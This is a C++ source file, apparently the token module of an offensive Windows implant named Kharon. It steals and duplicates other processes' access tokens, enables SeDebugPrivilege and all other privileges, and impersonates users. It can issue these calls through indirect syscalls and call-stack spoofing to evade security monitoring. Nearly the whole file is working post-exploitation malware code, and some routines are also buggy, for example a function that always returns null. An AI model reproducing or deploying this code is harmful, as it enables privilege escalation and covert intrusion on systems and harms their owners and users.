#include <Kharon.h>

using namespace Root;

auto DECLFN Token::CurrentPs( VOID ) -> HANDLE {
    HANDLE hToken = nullptr;
    
    this->TdOpen( NtCurrentThread(), TOKEN_QUERY, FALSE, &hToken );
    this->ProcOpen( NtCurrentProcess(), TOKEN_QUERY, &hToken );

    return hToken;
}

auto DECLFN Token::CurrentThread( VOID ) -> HANDLE {
    HANDLE hToken = nullptr;
     
    this->TdOpen( NtCurrentThread(), TOKEN_QUERY, FALSE, &hToken );
    
    return nullptr;
}

auto DECLFN Token::GetUser(
    _In_  HANDLE TokenHandle
) -> CHAR* {
    TOKEN_USER*  TokenUserPtr = nullptr;
    SID_NAME_USE SidName      = SidTypeUnknown;
    NTSTATUS     NtStatus     = STATUS_SUCCESS;

    CHAR* UserDom   = nullptr;
    ULONG TotalLen  = 0;
    ULONG ReturnLen = 0;
    ULONG DomainLen = 0;
    ULONG UserLen   = 0;
    BOOL  Success   = FALSE;

    NtStatus = Self->Ntdll.NtQueryInformationToken( TokenHandle, TokenUser, NULL, 0, &ReturnLen );
    if ( NtStatus != STATUS_BUFFER_TOO_SMALL ) {
        goto _KH_END;
    }

    TokenUserPtr = ( PTOKEN_USER )Self->Hp->Alloc( ReturnLen );
    if ( !TokenUserPtr ) {
        goto _KH_END;
    }

    NtStatus = Self->Ntdll.NtQueryInformationToken( TokenHandle, TokenUser, TokenUserPtr, ReturnLen, &ReturnLen );
    if ( !NT_SUCCESS( NtStatus ) ) { goto _KH_END; }

    Success = Self->Advapi32.LookupAccountSidA(
        NULL, TokenUserPtr->User.Sid, NULL,
        &UserLen, NULL, &DomainLen, &SidName
    );

    if ( !Success && KhGetError == ERROR_INSUFFICIENT_BUFFER ) {
        TotalLen = UserLen + DomainLen + 2;

        UserDom = (CHAR*)Self->Hp->Alloc( TotalLen );
        if ( !UserDom ) { goto _KH_END; }

        CHAR  Domain[DomainLen];
        CHAR  User[UserLen];

        Success = Self->Advapi32.LookupAccountSidA(
            NULL, TokenUserPtr->User.Sid, User,
            &UserLen, Domain, &DomainLen, &SidName
        );
        if ( !Success ) goto _KH_END;
        
        Str::ConcatA( UserDom, Domain );
        Str::ConcatA( UserDom, "\\" );
        Str::ConcatA( UserDom, User );
    }

_KH_END:
    if ( TokenUserPtr ) {
        Self->Hp->Free( TokenUserPtr );
    }

    if ( ! Success ) {
        Self->Hp->Free( UserDom );
        UserDom = nullptr;
    }
    
    return UserDom;
}

auto DECLFN Token::GetByID(
    _In_ ULONG TokenID
) -> HANDLE {
    if ( ! this->Node ) {
        return nullptr;
    }

    TOKEN_NODE* Current = this->Node;

    while ( Current ) {  
        if ( Current->TokenID == TokenID ) {
            return Current->Handle;
        }
        Current = Current->Next;
    }

    return nullptr;
}

auto DECLFN Token::Rev2Self( VOID ) -> BOOL {
    return Self->Advapi32.RevertToSelf();
}

auto DECLFN Token::Rm(
    _In_ ULONG TokenID
) -> BOOL {
    if ( ! this->Node ) {
        return FALSE;
    }

    TOKEN_NODE* Current  = this->Node;
    TOKEN_NODE* Previous = nullptr;

    if ( Current->TokenID == TokenID ) {
        this->Node = Current->Next;
        
        if ( Current->Handle && Current->Handle != INVALID_HANDLE_VALUE ) {
            Self->Ntdll.NtClose(Current->Handle);
        }
        
        if ( Current->User ) {
            Self->Hp->Free( Current->User );
        }
        
        Self->Hp->Free( Current );
        return TRUE;
    }

    while ( Current && Current->TokenID != TokenID ) {
        Previous = Current;
        Current  = Current->Next;
    }

    if ( ! Current ) {
        return FALSE;  
    }

    Previous->Next = Current->Next;

    if ( Current->Handle && Current->Handle != INVALID_HANDLE_VALUE ) {
        Self->Ntdll.NtClose(Current->Handle);
    }
    
    if ( Current->User ) {
        Self->Hp->Free( Current->User );
    }
    
    Self->Hp->Free( Current );
    return TRUE;
}

auto DECLFN Token::Use(
    _In_ HANDLE TokenHandle
) -> BOOL {
    return Self->Advapi32.ImpersonateLoggedOnUser( TokenHandle ); 
}

auto DECLFN Token::Add(
    _In_ HANDLE TokenHandle,
    _In_ ULONG  ProcessID
) -> TOKEN_NODE* {
    if ( ! TokenHandle || TokenHandle == INVALID_HANDLE_VALUE ) {
        return nullptr;
    }

    TOKEN_NODE* NewNode = (TOKEN_NODE*)Self->Hp->Alloc( sizeof(TOKEN_NODE) );
    if ( ! NewNode ) {
        return nullptr;
    }

    ULONG TokenID;
    do {
        TokenID = Rnd32() % 9999;
    } while ( this->GetByID( TokenID ) );

    NewNode->Handle    = TokenHandle;
    NewNode->Host      = 0;
    NewNode->ProcessID = ProcessID;
    NewNode->User      = this->GetUser(TokenHandle);
    NewNode->TokenID   = TokenID;
    NewNode->Next      = nullptr;

    if ( ! this->Node ) {
        this->Node = NewNode; 
    } else {
        TOKEN_NODE* Current = this->Node;
        while (Current->Next) {
            Current = Current->Next;
        }
        Current->Next = NewNode; 
    }

    return NewNode;
}

auto DECLFN Token::ListPrivs(
    _In_  HANDLE  TokenHandle,
    _Out_ ULONG  &ListCount
) -> PVOID {
    ULONG             TokenInfoLen = 0;
    TOKEN_PRIVILEGES* TokenPrivs   = nullptr;
    PRIV_LIST**       PrivList     = nullptr;

    Self->Advapi32.GetTokenInformation( TokenHandle, TokenPrivileges, nullptr, 0, &TokenInfoLen );

    TokenPrivs = (TOKEN_PRIVILEGES*)Self->Hp->Alloc( TokenInfoLen );
    if ( ! TokenPrivs ) return nullptr;

    if ( ! Self->Advapi32.GetTokenInformation( TokenHandle, TokenPrivileges, TokenPrivs, TokenInfoLen, &TokenInfoLen ) ) {
        return nullptr;
    }

    ListCount = TokenPrivs->PrivilegeCount;
    PrivList  = (PRIV_LIST**)Self->Hp->Alloc( sizeof( PRIV_LIST ) * ListCount );

    for ( INT i = 0; i < ListCount; i++ ) {
        LUID  luid     = TokenPrivs->Privileges[i].Luid;
        ULONG PrivLen  = MAX_PATH;
        CHAR* PrivName = (CHAR*)Self->Hp->Alloc( PrivLen );

        Self->Advapi32.LookupPrivilegeNameA( nullptr, &luid, PrivName, &PrivLen );

        PrivList[i]->PrivName   = PrivName;
        PrivList[i]->Attributes = TokenPrivs->Privileges[i].Attributes;
    }

    Self->Hp->Free( TokenPrivs );

    return PrivList;
}

auto DECLFN Token::GetPrivs(
    _In_ HANDLE TokenHandle
) -> BOOL {
    ULONG PrivListLen = 0;
    PVOID PrivList    = nullptr;

    PrivList = this->ListPrivs( TokenHandle, PrivListLen );

    for ( INT i = 0; i < PrivListLen; i++ ) {
        if ( ! this->SetPriv( TokenHandle, static_cast<PRIV_LIST**>(PrivList)[i]->PrivName ) ) return FALSE;
    }

    return TRUE;
}

auto DECLFN Token::Steal(
    _In_ ULONG ProcessID
) -> TOKEN_NODE* {
    HANDLE      TokenHandle     = INVALID_HANDLE_VALUE;
    HANDLE      TokenDuplicated = INVALID_HANDLE_VALUE;
    HANDLE      ProcessHandle   = INVALID_HANDLE_VALUE;
    TOKEN_NODE* NewNode         = nullptr;

    if ( TokenHandle = this->CurrentPs() ) {
        this->SetPriv( TokenHandle, "SeDebugPrivilege" );
        Self->Ntdll.NtClose( TokenHandle ); TokenHandle = nullptr;
    }

    ProcessHandle = Self->Ps->Open( PROCESS_QUERY_INFORMATION, TRUE, ProcessID );
    if ( ! ProcessHandle || ProcessHandle == INVALID_HANDLE_VALUE ) {
        goto _KH_END;
    }

    if ( ! this->ProcOpen( ProcessHandle, TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY, &TokenHandle ) ||
        TokenHandle == INVALID_HANDLE_VALUE) {
        goto _KH_END;
    }

    Self->Ntdll.NtClose( ProcessHandle );

    if ( Self->Advapi32.DuplicateTokenEx( TokenHandle, MAXIMUM_ALLOWED, nullptr, SecurityImpersonation, TokenImpersonation, &TokenDuplicated ) ) {
        Self->Ntdll.NtClose( TokenHandle );
        return this->Add( TokenDuplicated, ProcessID );
    } else {
        return this->Add( TokenHandle, ProcessID );
    }

_KH_END:
    if ( TokenHandle != INVALID_HANDLE_VALUE ) {
        Self->Ntdll.NtClose( TokenHandle );
    }

    if ( ProcessHandle != INVALID_HANDLE_VALUE ) {
        Self->Ntdll.NtClose( ProcessHandle );
    }

    if ( NewNode ) {
        Self->Hp->Free( NewNode );
    }

    return nullptr;
}

auto DECLFN Token::SetPriv(
    _In_ HANDLE Handle,
    _In_ CHAR*  PrivName
) -> BOOL {
    LUID Luid = { 0 };

    TOKEN_PRIVILEGES Privs = { 0 };

    BOOL Success = FALSE;

    Success = Self->Advapi32.LookupPrivilegeValueA( nullptr, PrivName, &Luid );
    if ( !Success ) return Success;

    Privs.PrivilegeCount           = 1;
    Privs.Privileges[0].Luid       = Luid;
    Privs.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    Success = Self->Advapi32.AdjustTokenPrivileges( Handle, FALSE, &Privs, sizeof( TOKEN_PRIVILEGES ), nullptr, 0 );
    return Success;
}

auto DECLFN Token::TdOpen(
    _In_  HANDLE  ThreadHandle,
    _In_  ULONG   RightsAccess,
    _In_  BOOL    OpenAsSelf,
    _Out_ HANDLE* TokenHandle
) -> BOOL {
    const UINT32 Flags = SYSCALL_FLAGS;
    NTSTATUS Status = STATUS_UNSUCCESSFUL;

    if (!(Flags & (SYSCALL_INDIRECT | SYSCALL_SPOOF))) {
        return Self->Advapi32.OpenThreadToken(
            ThreadHandle, RightsAccess, OpenAsSelf, TokenHandle
        );
    }

    UPTR Address = (Flags & SYSCALL_INDIRECT)
        ? (UPTR)Self->Sys->Ext[Sys::OpenThToken].Instruction
        : (UPTR)Self->Ntdll.NtOpenThreadTokenEx;

    UPTR ssn = (Flags & SYSCALL_INDIRECT)
        ? (UPTR)Self->Sys->Ext[Sys::OpenThToken].ssn
        : 0;

    if (Flags & SYSCALL_INDIRECT && !(Flags & SYSCALL_SPOOF)) {
        SyscallExec(
            Sys::OpenThToken, Status, ThreadHandle, 
            RightsAccess, OpenAsSelf, 0, TokenHandle
        );
    } else {
        Status = Self->Spf->Call(
            Address, ssn, (UPTR)ThreadHandle, (UPTR)RightsAccess,
            (UPTR)OpenAsSelf, 0, (UPTR)TokenHandle
        );
    }

    Self->Usf->NtStatusToError(Status);
    return NT_SUCCESS(Status);
}

auto DECLFN Token::ProcOpen(
    _In_  HANDLE  ProcessHandle,
    _In_  ULONG   RightsAccess,
    _Out_ HANDLE* TokenHandle
) -> BOOL {
    const UINT32 Flags  = SYSCALL_FLAGS;
    NTSTATUS     Status = STATUS_UNSUCCESSFUL;

    if ( ! ( Flags & (SYSCALL_INDIRECT | SYSCALL_SPOOF) ) ) {
        return Self->Advapi32.OpenProcessToken(
            ProcessHandle, RightsAccess, TokenHandle
        );
    }

    UPTR Address = (Flags & SYSCALL_INDIRECT)
        ? (UPTR)Self->Sys->Ext[Sys::OpenPrToken].Instruction
        : (UPTR)Self->Ntdll.NtOpenProcessTokenEx;

    UPTR ssn = (Flags & SYSCALL_INDIRECT)
        ? (UPTR)Self->Sys->Ext[Sys::OpenPrToken].ssn
        : 0;

    if (Flags & SYSCALL_INDIRECT && !(Flags & SYSCALL_SPOOF)) {
        SyscallExec(Sys::OpenPrToken, Status, ProcessHandle,
                   RightsAccess, 0, TokenHandle);
    } else {
        Status = Self->Spf->Call(
            Address, ssn, (UPTR)ProcessHandle, (UPTR)RightsAccess,
            0, (UPTR)TokenHandle
        );
    }

    Self->Usf->NtStatusToError( Status );

    return NT_SUCCESS( Status );
}